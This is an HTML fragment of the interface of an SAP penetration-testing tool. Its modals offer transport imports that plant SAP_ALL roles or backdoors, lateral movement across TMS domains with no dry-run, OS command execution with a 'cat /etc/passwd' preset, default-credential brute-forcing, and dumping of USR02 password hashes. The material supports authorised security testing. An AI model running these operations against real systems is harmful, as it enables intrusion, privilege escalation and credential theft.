      <div id="attack-heatmap-body" style="padding:4px">
        <div style="color:#8b949e;text-align:center;padding:30px">Loading…</div>
      </div>
    </div>
    <div class="form-actions" style="margin-top:8px">
      <button class="btn" onclick="closeModal('attack-modal')">Close</button>
    </div>
  </div>
</div>

<!-- Import Local Transport modal -->
<div class="modal-overlay" id="import-transport-modal">
  <div class="modal" style="max-width:760px;width:95vw;display:flex;flex-direction:column;max-height:90vh">
    <h3 style="margin:0 0 6px 0">&#128230; Import Local Transport
      <span id="import-tr-sid" style="color:#8b949e;font-size:12px"></span>
    </h3>
    <div id="import-tr-form" style="overflow:auto">
      <div style="background:#3a0f10;border:1px solid #8b0000;border-radius:4px;padding:10px 12px;margin-bottom:12px;font-size:12px;color:#ffcccc;line-height:1.5">
        <strong style="color:#ff6b6b">&#9888;&#65039; Read this BEFORE running:</strong>
        This writes the cofile + datafile to <code>/usr/sap/trans/</code> on
        the target and runs <code>tp</code>.  A successful <code>tp import</code>
        permanently modifies the ABAP data dictionary, can grant SAP_ALL via
        planted roles, install backdoor programs, or break production.
        Default mode is <strong>dry-run</strong> (<code>tp tst</code>) which
        performs the full import logic but rolls back at the end — safe.
        Only uncheck dry-run after written authorisation.
      </div>
      <div id="import-tr-bundled-row" style="margin-bottom:12px;padding:10px 12px;background:#0d1117;border:1px solid #30363d;border-radius:4px">
        <div style="font-size:11px;color:#8b949e;margin-bottom:6px">
          Bundled payloads <span>— one-click, no file dialog. Post-verify + credential auto-pin where applicable.</span>
        </div>
        <div id="import-tr-bundled-buttons" style="display:flex;flex-wrap:wrap;gap:6px">
          <span style="color:#8b949e;font-size:12px">Loading…</span>
        </div>
        <div id="import-tr-bundled-selected" style="display:none;margin-top:8px;font-size:11.5px;color:#3fb950">
          <span id="import-tr-bundled-sel-txt"></span>
          <button type="button" class="btn" style="margin-left:8px;padding:2px 8px;font-size:11px"
                  onclick="clearImportTrBundled()">Clear</button>
        </div>
      </div>
      <div class="form-row" id="import-tr-file-row">
        <label>&hellip; or upload your own transport zip
          <span style="color:#8b949e;font-weight:normal">(must contain one
          <code>K&lt;num&gt;.&lt;SID&gt;</code> + one <code>R&lt;num&gt;.&lt;SID&gt;</code>)</span>
        </label>
        <input id="import-tr-zip" type="file" accept=".zip" style="width:100%">
      </div>
      <div class="form-row">
        <label>Target client</label>
        <input id="import-tr-client" type="text" value="001" maxlength="3" style="width:80px">
      </div>
      <div id="import-tr-channel-row" style="margin-top:14px;padding:10px 12px;background:#0d1117;border:1px solid #30363d;border-radius:4px">
        <div style="font-size:11px;color:#8b949e;margin-bottom:6px">
          Exec channel
          <span>— which OS-exec primitive carries the upload + <code>tp</code> calls</span>
        </div>
        <div id="import-tr-channel-opts" style="display:flex;flex-direction:column;gap:6px;font-size:12px;color:#cfd9df">
          <label class="channel-opt" style="display:flex;align-items:center;gap:8px;cursor:pointer;margin:0;padding:4px 0">
            <input type="radio" name="import-tr-channel" value="auto" checked
                   style="width:14px;height:14px;flex:0 0 14px;margin:0;padding:0;accent-color:#79c0ff;appearance:auto;-webkit-appearance:auto;border:none;background:transparent">
            <span><strong>Auto</strong> <span id="import-tr-auto-hint" style="color:#8b949e">(picks best)</span></span>
          </label>
          <label class="channel-opt" style="display:flex;align-items:center;gap:8px;cursor:pointer;margin:0;padding:4px 0" id="import-tr-channel-gw-lbl">
            <input type="radio" name="import-tr-channel" value="gw"
                   id="import-tr-channel-gw"
                   style="width:14px;height:14px;flex:0 0 14px;margin:0;padding:0;accent-color:#f85149;appearance:auto;-webkit-appearance:auto;border:none;background:transparent">
            <span><strong>GW SAPXPG</strong> <span style="color:#8b949e">— unauthenticated (needs <code>gw_vulnerable</code>)</span></span>
          </label>
          <label class="channel-opt" style="display:flex;align-items:center;gap:8px;cursor:pointer;margin:0;padding:4px 0" id="import-tr-channel-sxpg-lbl">
            <input type="radio" name="import-tr-channel" value="sxpg"
                   id="import-tr-channel-sxpg"
                   style="width:14px;height:14px;flex:0 0 14px;margin:0;padding:0;accent-color:#d29922;appearance:auto;-webkit-appearance:auto;border:none;background:transparent">
            <span><strong>SXPG_STEP_XPG_START</strong> <span style="color:#8b949e">— authenticated RFC (needs SAP_ALL cred)</span></span>
          </label>
        </div>
        <div id="import-tr-channel-note" style="margin-top:8px;font-size:11px;color:#8b949e;line-height:1.4"></div>
      </div>
      <div style="margin-top:14px;padding:10px 12px;background:#0d1117;border:1px solid #30363d;border-radius:4px">
        <label for="import-tr-dryrun" style="display:flex;align-items:center;gap:10px;cursor:pointer;margin:0;font-size:13px;color:#e6edf3">
          <input id="import-tr-dryrun" type="checkbox" checked
                 style="width:18px;height:18px;flex:0 0 18px;margin:0;cursor:pointer;accent-color:#3fb950">
          <span><strong>Dry-run only</strong> (<code>tp tst</code> with rollback — recommended)</span>
        </label>
        <div style="color:#8b949e;font-size:11px;margin-top:6px;margin-left:28px;line-height:1.4">
          <strong style="color:#d29922">Uncheck</strong> to perform a real
          <code>tp import</code>. Real imports always use <code>U1268</code>
          unconditional flags so the cross-domain (source SID ≠ this
          target) case works without extra setup.
        </div>
      </div>
    </div>

    <div id="import-tr-progress" style="display:none;margin-top:10px">
      <div style="font-size:12px;color:#cfd9df;margin-bottom:4px">
        <span id="import-tr-phase">phase</span> —
        <span id="import-tr-msg">…</span>
      </div>
      <div style="background:#0d1117;border:1px solid #21262d;border-radius:4px;height:14px;overflow:hidden">
        <div id="import-tr-bar" style="background:linear-gradient(90deg,#3fb950,#79c0ff);height:100%;width:0%;transition:width 200ms"></div>
      </div>
      <div style="display:flex;justify-content:space-between;font-size:10px;color:#8b949e;margin-top:2px">
        <span id="import-tr-counter">0 / 0</span>
        <span id="import-tr-eta">—</span>
      </div>
      <div id="import-tr-log" style="margin-top:8px;background:#010409;border:1px solid #21262d;border-radius:4px;padding:6px 8px;font-family:monospace;font-size:10.5px;color:#cfd9df;max-height:240px;overflow:auto;white-space:pre-wrap"></div>
    </div>

    <div id="import-tr-result" style="display:none;margin-top:10px;font-size:12px"></div>

    <div class="form-actions" style="margin-top:12px">
      <button id="import-tr-go" class="btn btn-primary" onclick="runImportTransport()">Run</button>
      <button class="btn" onclick="closeModal('import-transport-modal');_stopImportTrPoll()">Close</button>
    </div>
  </div>
</div>

<!-- TMS Propagate Transport (Bundle 3) — fan-out to every peer in the domain -->
<div class="modal-overlay" id="tms-propagate-modal">
  <div class="modal" style="max-width:900px;width:96vw;display:flex;flex-direction:column;max-height:92vh">
    <h3 style="margin:0 0 6px 0">&#127919; Propagate Transport across TMS Domain
      <span id="tms-prop-sid" style="color:#8b949e;font-size:12px"></span>
    </h3>
    <div id="tms-prop-form" style="overflow:auto">
      <div style="background:#3a0f10;border:1px solid #8b0000;border-radius:4px;padding:10px 12px;margin-bottom:12px;font-size:12px;color:#ffcccc;line-height:1.5">
        <strong style="color:#ff6b6b">&#9888;&#65039; TMS lateral movement:</strong>
        Fans a released transport out to every reachable peer in this
        source's TMS domain. For each target it tries the
        <code>TMS_MGR_FORWARD/IMPORT</code> RFC path first, then falls
        back to per-target <code>tp addtobuffer</code> + <code>tp import</code>
        over the OS-exec channel. Successful hops receive the same
        post-import <code>RFC_PING</code> verify as a local import — a
        successful user-create bundle pins SAPMAP00 / client 000 on
        every target it lands on.
      </div>
      <div id="tms-prop-bundled-row" style="margin-bottom:12px;padding:10px 12px;background:#0d1117;border:1px solid #30363d;border-radius:4px">
        <div style="font-size:11px;color:#8b949e;margin-bottom:6px">
          Bundled payloads
        </div>
        <div id="tms-prop-bundled-buttons" style="display:flex;flex-wrap:wrap;gap:6px">
          <span style="color:#8b949e;font-size:12px">Loading…</span>
        </div>
        <div id="tms-prop-bundled-selected" style="display:none;margin-top:8px;font-size:11.5px;color:#3fb950">
          <span id="tms-prop-bundled-sel-txt"></span>
          <button type="button" class="btn" style="margin-left:8px;padding:2px 8px;font-size:11px"
                  onclick="clearTMSPropBundle()">Clear</button>
        </div>
      </div>
      <div class="form-row" id="tms-prop-file-row">
        <label>&hellip; or upload your own transport zip</label>
        <input id="tms-prop-zip" type="file" accept=".zip" style="width:100%">
      </div>

      <div class="form-row" style="display:flex;gap:12px;align-items:flex-end">
        <div style="flex:0 0 100px">
          <label>Target client</label>
          <input id="tms-prop-client" type="text" value="000" maxlength="3" style="width:80px">
          <div style="color:#8b949e;font-size:10px;margin-top:2px">Ignored by XPRA — always runs in 000</div>
        </div>
        <div style="flex:1">
          <label>Path mode</label>
          <select id="tms-prop-path-mode" style="width:100%">
            <option value="rfc-first" selected>RFC-first, OS-exec fallback (recommended)</option>
            <option value="rfc-only">RFC-only (skip target if RFC fails)</option>
            <option value="os-only">OS-exec only (skip TMS RFC path)</option>
          </select>
        </div>
      </div>

      <div id="tms-prop-hops-row" style="margin-top:12px;padding:10px 12px;background:#0d1117;border:1px solid #30363d;border-radius:4px">
        <div style="font-size:11px;color:#8b949e;margin-bottom:6px">
          Reachable peers in this source's TMS domain
        </div>
        <div id="tms-prop-hops-preview" style="font-family:monospace;font-size:11px;color:#cfd9df">
          (Open the modal to populate)
        </div>
      </div>

      <!-- ─── STMS Secure-Trust impersonation section ───────────
           Auto-populated after recon.  Hidden when SINSON=0.
           When SINSON=1 and no impersonation user is pinned yet,
           shows the candidate picker + Test button.  When one IS
           pinned, shows the confirmed user with a "Re-test" link. -->
      <div id="tms-prop-impers-row" style="display:none;margin-top:12px;padding:10px 12px;background:#161b22;border-left:3px solid #d29922;border-radius:4px">
        <div style="font-size:12px;color:#d29922;font-weight:600;margin-bottom:4px">
          🔐 STMS Secure Trust active (SINSON=1) — impersonation required
        </div>
        <div id="tms-prop-impers-help" style="font-size:11px;color:#8b949e;margin-bottom:8px">
          Target verifies the caller username exists in its client 000.
          Pick a source user to test as (SAP_ALL first):
        </div>
        <div id="tms-prop-impers-pinned" style="display:none;font-size:11px;color:#3fb950;margin-bottom:8px"></div>
        <div id="tms-prop-impers-picker" style="max-height:200px;overflow:auto;background:#0d1117;border:1px solid #30363d;border-radius:3px;padding:4px">
          <div style="color:#6e7681;font-size:11px;padding:6px">
            (Loading candidates…)
          </div>
        </div>
        <div style="margin-top:8px;display:flex;gap:8px;align-items:center;font-size:11px">
          <button id="tms-prop-impers-test-btn" class="btn"
                  onclick="runTMSImpersonationTest()"
                  disabled style="font-size:11px;padding:4px 10px">
            🧪 Test impersonation (canary)
          </button>
          <span id="tms-prop-impers-status" style="color:#8b949e"></span>
        </div>
      </div>

      <!-- Dry-run checkbox intentionally removed from the TMS
           propagation modal — this action always executes the real
           import as part of the lateral-movement demonstration.
           The equivalent checkbox is still present in the "Import
           Local Transport" modal for safe local trial-runs. -->
      <input id="tms-prop-dryrun" type="hidden" value="">
    </div>

    <div id="tms-prop-progress" style="display:none;margin-top:10px">
      <div style="font-size:12px;color:#cfd9df;margin-bottom:6px">
        <span id="tms-prop-phase">phase</span> — <span id="tms-prop-msg">…</span>
      </div>
      <div id="tms-prop-grid" style="display:flex;flex-direction:column;gap:4px;font-family:monospace;font-size:11px;max-height:340px;overflow:auto"></div>
    </div>

    <div id="tms-prop-result" style="display:none;margin-top:10px;font-size:12px;user-select:text;-webkit-user-select:text;cursor:text"></div>

    <div class="form-actions" style="margin-top:12px">
      <button id="tms-prop-go" class="btn btn-primary" onclick="runTMSPropagate()">Run</button>
      <button class="btn" onclick="closeModal('tms-propagate-modal');_stopTMSPropPoll()">Close</button>
    </div>
  </div>
</div>

<!-- hashes.com API Key Modal -->
<div class="modal-overlay" id="hashes-api-modal">
  <div class="modal" style="max-width:480px">
    <h3>&#128273; hashes.com API Key</h3>
    <div style="font-size:12px;color:#8b949e;margin-bottom:12px">
      Get a free API key at <a href="https://hashes.com" target="_blank" style="color:#58a6ff">hashes.com</a>.
      Stored locally in <code>settings.local.json</code> (gitignored, never pushed).
    </div>
    <div class="form-row">
      <label>API Key</label>
      <input type="password" id="hashes-api-key-input" placeholder="paste key here" autocomplete="off">
    </div>
    <div class="form-actions">
      <button class="btn btn-primary" onclick="saveHashesApiKey()">Save</button>
      <button class="btn" onclick="closeModal('hashes-api-modal')">Cancel</button>
    </div>
  </div>
</div>

<!-- NW RFC SDK Path Modal -->
<div class="modal-overlay" id="sdk-path-modal">
  <div class="modal" style="max-width:560px">
    <h3>&#128194; NW RFC SDK Path</h3>
    <div id="sdk-path-help" style="font-size:12px;color:#8b949e;margin-bottom:12px;line-height:1.5">
      Path to the SAP NW RFC SDK <code>lib/</code> directory (the folder containing
      <code>libsapnwrfc.so</code> on Linux, <code>libsapnwrfc.dylib</code> on macOS,
      or <code>sapnwrfc.dll</code> on Windows).  Enables all authenticated RFC
      operations (BAPI calls, SecStore, RSAU_API, etc.).
      <br><br>
      Saved in <code>settings.local.json</code> (gitignored) and loaded on every
      startup — equivalent to passing <code>--sdk &lt;path&gt;</code> on the CLI.
      A <code>--sdk</code> flag on the command line still overrides this value.
      Leave empty and Save to clear.
    </div>
    <!-- Container-mode informational banner — swapped in for the
         normal help text when running inside a Docker container.
         The SDK path is set by the entrypoint on every restart and
         settings.local.json inside the container is ephemeral, so
         there's nothing meaningful to edit here. -->
    <div id="sdk-path-container-notice" style="display:none;font-size:12px;color:#c9d1d9;margin-bottom:12px;line-height:1.5;background:#161b22;border:1px solid #30363d;border-radius:6px;padding:12px;word-break:break-all;overflow-wrap:anywhere">
      <div style="color:#58a6ff;font-weight:600;margin-bottom:6px">&#128230; Running inside a Docker container</div>
      <div id="sdk-path-container-body"></div>
    </div>
    <div class="form-row" id="sdk-path-form-row">
      <label>SDK lib/ path</label>
      <input type="text" id="sdk-path-input" placeholder="e.g. ./nwrfcsdk/lib or /opt/nwrfcsdk/lib" autocomplete="off">
    </div>
    <!-- word-break here handles the "Active from --sdk : /long/path" line
         which otherwise overflowed the modal in container mode. -->
    <div id="sdk-path-current" style="font-size:11px;color:#8b949e;margin-bottom:12px;word-break:break-all;overflow-wrap:anywhere"></div>
    <div class="form-actions">
      <button class="btn btn-primary" id="sdk-path-save-btn" onclick="saveSdkPath()">Save</button>
      <button class="btn" onclick="closeModal('sdk-path-modal')" id="sdk-path-cancel-btn">Cancel</button>
    </div>
  </div>
</div>

<!-- SAPology Path Modal (Deep Scan) -->
<div class="modal-overlay" id="sapology-path-modal">
  <div class="modal" style="max-width:560px">
    <h3>&#128194; SAPology Path (Deep Scan)</h3>
    <div style="font-size:12px;color:#8b949e;margin-bottom:12px;line-height:1.5">
      Path to the <a href="https://github.com/kloris/SAPology" target="_blank" style="color:#58a6ff">SAPology</a> checkout used for Deep Scan vulnerability
      assessment.  Defaults to a sibling directory of the SAPMAP root
      (<code>../SAPology</code>).
      <br><br>
      Saved in <code>settings.local.json</code> (gitignored) and applied
      immediately — the next Deep Scan uses the new location without a
      restart.  Also configurable via <code>--sapology &lt;path&gt;</code> on the
      CLI or the <code>SAPMAP_SAPOLOGY_PATH</code> env var (both take priority).
      Leave empty and Save to revert to the default sibling directory.
    </div>
    <div class="form-row">
      <label>SAPology directory</label>
      <input type="text" id="sapology-path-input" placeholder="e.g. /Users/you/git/SAPology" autocomplete="off">
    </div>
    <div id="sapology-path-current" style="font-size:11px;color:#8b949e;margin-bottom:12px;word-break:break-all;overflow-wrap:anywhere"></div>
    <div class="form-actions">
      <button class="btn btn-primary" onclick="saveSapologyPath()">Save</button>
      <button class="btn" onclick="closeModal('sapology-path-modal')">Cancel</button>
    </div>
  </div>
</div>

<!-- Scan All Vulnerabilities Modal -->
<div class="modal-overlay" id="vulns-select-modal">
  <div class="modal" style="max-width:560px;width:95vw">
    <h3>&#128299; Scan for Vulnerabilities</h3>
    <div id="vulns-select-info" style="font-size:12px;color:#8b949e;margin-bottom:12px"></div>
    <div style="font-size:11px;color:#8b949e;margin-bottom:10px;line-height:1.5">
      Each check is a passive probe — no user is created, no command is executed.
      Eligibility is enforced per node (Java-only checks skip ABAP, etc.).
      Press STOP to cancel mid-sweep.
    </div>
    <div style="display:flex;flex-direction:column;gap:6px;margin-bottom:14px">
      <label class="autopwn-cb"><input type="checkbox" id="vsel-gw" checked> RFC Gateway Vulnerability (every SAP)</label>
      <label class="autopwn-cb"><input type="checkbox" id="vsel-ms" checked> MS Betrusted / CVE-2020-6207 (every SAP)</label>
      <label class="autopwn-cb"><input type="checkbox" id="vsel-cve-31324" checked> CVE-2025-31324 — VisualComposer JSP unauth (Java only)</label>
      <label class="autopwn-cb"><input type="checkbox" id="vsel-cve-6287" checked> CVE-2020-6287 — RECON (Java only)</label>
      <label class="autopwn-cb"><input type="checkbox" id="vsel-cve-22536" checked> CVE-2022-22536 — ICMAD smuggle (ABAP / Java / WD)</label>
      <label class="autopwn-cb"><input type="checkbox" id="vsel-router-info" checked> SAProuter Info Leak (SAProuter nodes)</label>
      <label class="autopwn-cb" style="color:#d29922">
        <input type="checkbox" id="vsel-default-creds">
        Default Credentials Test (DIAG) &mdash; <strong>may LOCK accounts</strong>
      </label>
    </div>
    <div style="font-size:10px;color:#484f58;margin-bottom:14px;line-height:1.5">
      Default Credentials probes SAP*, DDIC, TMSADM, EARLYWATCH, SAPCPIC and friends
      against each enumerated client.  Failed attempts can lock accounts after the
      configured retry threshold (typically 3-5) — only enable on systems where you
      can tolerate that.
    </div>
    <div class="form-actions">
      <button class="btn" onclick="selectAllVulns(true)">Select all</button>
      <button class="btn" onclick="selectAllVulns(false)">Deselect all</button>
      <button class="btn btn-primary" onclick="runSelectedVulns()">Run Selected</button>
      <button class="btn" onclick="closeModal('vulns-select-modal')">Cancel</button>
    </div>
  </div>
</div>

<!-- SAPControl OSExecute Modal — draggable + resizable -->
<div class="modal-overlay" id="osexecute-modal" style="align-items:flex-start">
  <div class="modal" id="osexecute-modal-inner"
       style="max-width:none;width:900px;height:640px;min-width:520px;min-height:400px;overflow:hidden;display:flex;flex-direction:column;position:relative;padding:0">
    <div id="osexecute-drag-handle"
         style="cursor:move;user-select:none;padding:16px 20px 8px 20px;border-bottom:1px solid #30363d">
      <h3 style="margin:0">&#9889; OS Command via SAPControl OSExecute
        <span style="float:right;font-size:10px;color:#484f58;font-weight:400">drag header to move · resize from bottom-right</span>
      </h3>
    </div>
    <!-- Custom resize handle — a small triangle in the bottom-right
         corner.  CSS resize:both is unreliable with flex parents +
         align-items:flex-start on the overlay, so we drive it in JS. -->
    <div id="osexecute-resize-handle" title="drag to resize"
         style="position:absolute;right:2px;bottom:2px;width:16px;height:16px;cursor:nwse-resize;background:linear-gradient(135deg,transparent 0%,transparent 45%,#484f58 46%,#484f58 55%,transparent 56%,transparent 70%,#484f58 71%,#484f58 80%,transparent 81%);z-index:5"></div>
    <div style="padding:12px 20px;overflow:auto;flex:0 0 auto">
      <div id="osexecute-context" style="font-size:12px;color:#8b949e;margin-bottom:8px"></div>
      <div style="font-size:11px;color:#8b949e;margin-bottom:10px;line-height:1.5">
        Runs the command as <code>&lt;sid&gt;adm</code> — the OS user that owns the SAP install
        on the target host.  SAPMAP auto-wraps the command in the target OS's shell
        (<code>/bin/sh -c</code> on Unix, <code>cmd.exe /c</code> on Windows) so PATH
        lookups + <code>|</code> / <code>&amp;&amp;</code> / redirects work as expected.
        Wrapping is skipped when the command already starts with an absolute path or
        shell binary.
      </div>
      <div class="form-row">
        <label>Command</label>
        <input type="text" id="osexecute-cmd" placeholder="whoami"
               onkeydown="if(event.key==='Enter'){event.preventDefault();runOSExecute();}">
      </div>
      <div class="form-row" style="display:flex;gap:12px;align-items:center">
        <div style="flex:1">
          <label>Timeout (seconds)</label>
          <input type="number" id="osexecute-timeout" value="30" min="1" max="300" style="width:100px">
        </div>
        <div style="flex:2;font-size:10px;color:#484f58;line-height:1.4">
          Presets:
          <a href="#" onclick="event.preventDefault();document.getElementById('osexecute-cmd').value='whoami'"><code>whoami</code></a> ·
          <a href="#" onclick="event.preventDefault();document.getElementById('osexecute-cmd').value='id'"><code>id</code></a> ·
          <a href="#" onclick="event.preventDefault();document.getElementById('osexecute-cmd').value='uname -a'"><code>uname -a</code></a> ·
          <a href="#" onclick="event.preventDefault();document.getElementById('osexecute-cmd').value='cat /etc/passwd'"><code>cat /etc/passwd</code></a> ·
          <a href="#" onclick="event.preventDefault();document.getElementById('osexecute-cmd').value='ls -la /usr/sap'"><code>ls /usr/sap</code></a>
        </div>
      </div>
    </div>
    <div style="padding:0 20px;flex:1 1 auto;display:flex;flex-direction:column;min-height:0">
      <label style="font-size:11px;color:#8b949e;margin-bottom:3px;display:block">Output</label>
      <pre id="osexecute-output"
           style="background:#0d1117;border:1px solid #30363d;padding:8px;border-radius:4px;flex:1 1 auto;overflow:auto;font-size:11px;color:#e6edf3;white-space:pre-wrap;word-break:break-all;margin:0;min-height:120px"></pre>
    </div>
    <div class="form-actions" style="padding:12px 20px 16px 20px;border-top:1px solid #30363d;margin-top:0">
      <button class="btn btn-primary" onclick="runOSExecute()">Run</button>
      <button class="btn" onclick="closeModal('osexecute-modal')">Close</button>
    </div>
  </div>
</div>

<!-- Table Download Modal -->
<div class="modal-overlay" id="table-modal">
  <div class="modal">
    <h3>&#128229; Download Table Data</h3>
    <div class="form-row">
      <label>Table Name</label>
      <input type="text" id="tbl-name" placeholder="e.g. USR02, T000">
    </div>
    <div class="form-row">
      <label>Fields (comma-separated, empty=all)</label>
      <input type="text" id="tbl-fields" placeholder="MANDT,BNAME,BCODE">
    </div>
    <div class="form-row">
      <label>WHERE Clause (optional)</label>
      <input type="text" id="tbl-where" placeholder="e.g. BNAME = 'DDIC'">
    </div>
    <div class="form-row">
      <label>Max Rows</label>
      <input type="number" id="tbl-maxrows" value="500">
    </div>
    <div class="form-actions">
      <button class="btn btn-primary" onclick="downloadTable()">Download</button>
      <button class="btn" onclick="closeModal('table-modal')">Cancel</button>
    </div>
  </div>
</div>

<!-- Set System Type Modal -->
<div class="modal-overlay" id="type-modal">
  <div class="modal">
    <h3>&#9881; Set System Type</h3>
    <div id="type-system-info" style="font-size:12px;color:#8b949e;margin-bottom:12px"></div>
    <div class="form-row">
      <label>System Type</label>
      <select id="type-select">
        <option value="" disabled selected hidden>Select type...</option>
        <option value="ABAP">ABAP</option>
        <option value="JAVA">Java</option>
        <option value="ABAP+JAVA">ABAP+Java</option>
        <option value="BUSINESSOBJECTS">BusinessObjects</option>
        <option value="CLOUD_CONNECTOR">Cloud Connector</option>
        <option value="CONTENT_SERVER">Content Server</option>
        <option value="WEB_DISPATCHER">Web Dispatcher</option>
        <option value="SAPROUTER">SAPRouter</option>
        <option value="MDM">MDM</option>
        <option value="HANA">HANA</option>
      </select>
    </div>
    <div class="form-actions">
      <button class="btn btn-primary" onclick="saveSystemType()">Save</button>
      <button class="btn" onclick="closeModal('type-modal')">Cancel</button>
    </div>
  </div>
</div>

<!-- Set DB Type Modal -->
<div class="modal-overlay" id="db-type-modal">
  <div class="modal">
    <h3>&#9881; Set DB Type</h3>
    <div id="db-type-system-info" style="font-size:12px;color:#8b949e;margin-bottom:12px"></div>
    <div class="form-row">
      <label>Database Type</label>
      <select id="db-type-select">
        <option value="" disabled selected hidden>Select DB type...</option>
        <option value="HDB">HANA (HDB)</option>
        <option value="ADA">MaxDB / ADABAS D (ADA)</option>
        <option value="ORA">Oracle (ORA)</option>
        <option value="MSS">MS SQL Server (MSS)</option>
        <option value="DB6">DB2 (DB6)</option>
      </select>
    </div>
    <div class="form-actions">
      <button class="btn btn-primary" onclick="saveDbType()">Save</button>
      <button class="btn" onclick="closeModal('db-type-modal')">Cancel</button>
    </div>
  </div>
</div>

<!-- Set OS Type Modal -->
<div class="modal-overlay" id="os-type-modal">
  <div class="modal">
    <h3>&#9881; Set OS Type</h3>
    <div id="os-type-system-info" style="font-size:12px;color:#8b949e;margin-bottom:12px"></div>
    <div class="form-row">
      <label>Operating System</label>
      <select id="os-type-select">
        <option value="" disabled selected hidden>Select OS type...</option>
        <option value="Linux">Linux</option>
        <option value="Windows">Windows</option>
        <option value="AIX">AIX</option>
        <option value="HP-UX">HP-UX</option>
        <option value="SunOS">SunOS / Solaris</option>
      </select>
    </div>
    <div class="form-actions">
      <button class="btn btn-primary" onclick="saveOsType()">Save</button>
      <button class="btn" onclick="closeModal('os-type-modal')">Cancel</button>
    </div>
  </div>
</div>

<!-- Set SID Modal -->
<div class="modal-overlay" id="sid-modal">
  <div class="modal" onkeydown="if(event.key==='Enter'){event.preventDefault();saveSid();}">
    <h3>&#9881; Set SAP System ID (SID)</h3>
    <div id="sid-system-info" style="font-size:12px;color:#8b949e;margin-bottom:12px"></div>
    <div class="form-row">
      <label>SID (3 alphanumeric characters, uppercase)</label>
      <input type="text" id="sid-input" maxlength="3" placeholder="PRD" style="width:100px;text-align:center;font-family:monospace;text-transform:uppercase"
             oninput="this.value=this.value.toUpperCase().replace(/[^A-Z0-9]/g,'')">
      <span style="font-size:10px;color:#484f58;margin-top:2px;display:block">
        Used to identify the system across all RFC destinations, connections, credentials, forged
        tickets and created users.  Renaming a placeholder Wxx / UNK_&lt;ip&gt; SID to the real one
        rewires every reference automatically.
      </span>
    </div>
    <div class="form-actions">
      <button class="btn btn-primary" onclick="saveSid()">Save</button>
      <button class="btn" onclick="closeModal('sid-modal')">Cancel</button>
    </div>
  </div>
</div>

<!-- Set Instance Number Modal -->
<div class="modal-overlay" id="instance-nr-modal">
  <div class="modal" onkeydown="if(event.key==='Enter'){event.preventDefault();saveInstanceNr();}">
    <h3>&#9881; Set Instance Number</h3>
    <div id="instance-nr-system-info" style="font-size:12px;color:#8b949e;margin-bottom:12px"></div>
    <div class="form-row">
      <label>Instance Number (00-97)</label>
      <input type="text" id="instance-nr-input" maxlength="2" placeholder="00" style="width:80px;text-align:center;font-family:monospace">
      <span style="font-size:10px;color:#484f58;margin-top:2px;display:block">Two-digit SAP instance number. Drives derived ports (32NN dispatcher, 33NN gateway, 36NN MS, 81NN ICM, 50NN+ Java) used by RFC and exploit actions.</span>
    </div>
    <div class="form-actions">
      <button class="btn btn-primary" onclick="saveInstanceNr()">Save</button>
      <button class="btn" onclick="closeModal('instance-nr-modal')">Cancel</button>
    </div>
  </div>
</div>

<!-- Set SAProuter Modal -->
<div class="modal-overlay" id="saprouter-modal">
  <div class="modal" onkeydown="if(event.key==='Enter'){event.preventDefault();saveSaprouter();}">
    <h3>&#128268; Set SAProuter</h3>
    <div id="saprouter-system-info" style="font-size:12px;color:#8b949e;margin-bottom:12px"></div>
    <div class="form-row">
      <label>SAProuter String</label>
      <input type="text" id="saprouter-input" placeholder="/H/router_ip/S/3299/W/password" style="width:100%">
      <span style="font-size:10px;color:#484f58;margin-top:2px;display:block">Route prefix to reach this system. Leave empty to remove SAProuter. All RFC and GW connections will route through this.</span>
    </div>
    <div class="form-actions">
      <button class="btn btn-primary" onclick="saveSaprouter()">Save</button>
      <button class="btn" onclick="closeModal('saprouter-modal')">Cancel</button>
    </div>
  </div>
</div>

<!-- SAProuter Internal Scan Modal -->
<div class="modal-overlay" id="router-scan-modal">
  <div class="modal">
    <h3>&#128270; Scan Internally via SAProuter</h3>
    <div id="router-scan-info" style="font-size:12px;color:#8b949e;margin-bottom:12px"></div>
    <div class="form-row">
      <label>Target IP Range</label>
      <input type="text" id="router-scan-targets" placeholder="e.g. 192.168.2.0/24 or 192.168.2.1,192.168.2.2" style="width:100%">
      <span style="font-size:10px;color:#484f58;margin-top:2px;display:block">
        CIDR, single IP, or comma-separated list.
        Leave empty to use IPs from the Router Info Leak.
      </span>
    </div>
    <div id="router-scan-autotargets-row" style="display:none" class="form-row">
      <label style="display:flex;align-items:center;gap:6px;cursor:pointer">
        <input type="checkbox" id="router-scan-auto" checked style="width:auto">
        Also include IPs from Router Info Leak
        <span id="router-scan-auto-count" style="color:#3fb950;font-size:11px"></span>
      </label>
    </div>
    <div style="display:flex;gap:12px">
      <div class="form-row" style="flex:1">
        <label>Instance range</label>
        <div style="display:flex;align-items:center;gap:6px">
          <input type="number" id="router-scan-inst-from" value="0" min="0" max="99" style="width:52px">
          <span style="color:#484f58">–</span>
          <input type="number" id="router-scan-inst-to" value="10" min="0" max="99" style="width:52px">
        </div>
        <span style="font-size:10px;color:#484f58;margin-top:2px;display:block">SAP instances NN to scan (e.g. 0–10 probes ports 3200–3210, 3300–3310)</span>
      </div>
      <div class="form-row" style="flex:1">
        <label>Mode</label>
        <select id="router-scan-mode" style="width:100%">
          <option value="sap" selected>SAP (dispatcher + gateway + sapcontrol)</option>
          <option value="full">Full (+ HANA SQL + Java)</option>
        </select>
      </div>
    </div>
    <div style="display:flex;gap:12px">
      <div class="form-row" style="flex:1">
        <label>Concurrency</label>
        <input type="number" id="router-scan-concurrency" value="10" min="1" max="50" style="width:60px">
        <span style="font-size:10px;color:#484f58;margin-top:2px;display:block">Simultaneous probes per host. Keep ≤10 to avoid flooding the SAProuter.</span>
      </div>
      <div class="form-row" style="flex:1">
        <label>Probe timeout (s)</label>
        <input type="number" id="router-scan-timeout" value="5" min="1" max="30" style="width:60px">
      </div>
    </div>
    <div class="form-actions">
      <button class="btn btn-primary" onclick="startRouterScan()">&#128270; Start Scan</button>
      <button class="btn" onclick="closeModal('router-scan-modal')">Cancel</button>
    </div>
  </div>
</div>

<!-- Add System Modal -->
<div class="modal-overlay" id="add-system-modal">
  <div class="modal" onkeydown="if(event.key==='Enter'){event.preventDefault();addSystem();}">
    <h3>&#10133; Add System Manually</h3>
    <div class="form-row">
      <label>SID (3 letters)</label>
      <input type="text" id="add-sid" placeholder="e.g. PRD" maxlength="3" style="width:80px;text-transform:uppercase">
    </div>
    <div class="form-row">
      <label>IP / Hostname</label>
      <input type="text" id="add-ip" placeholder="e.g. 10.0.1.50 or sapserver">
    </div>
    <div class="form-row">
      <label>Instance Number (2 digits)</label>
      <input type="text" id="add-instance" placeholder="00" maxlength="2" style="width:60px">
    </div>
    <div class="form-row">
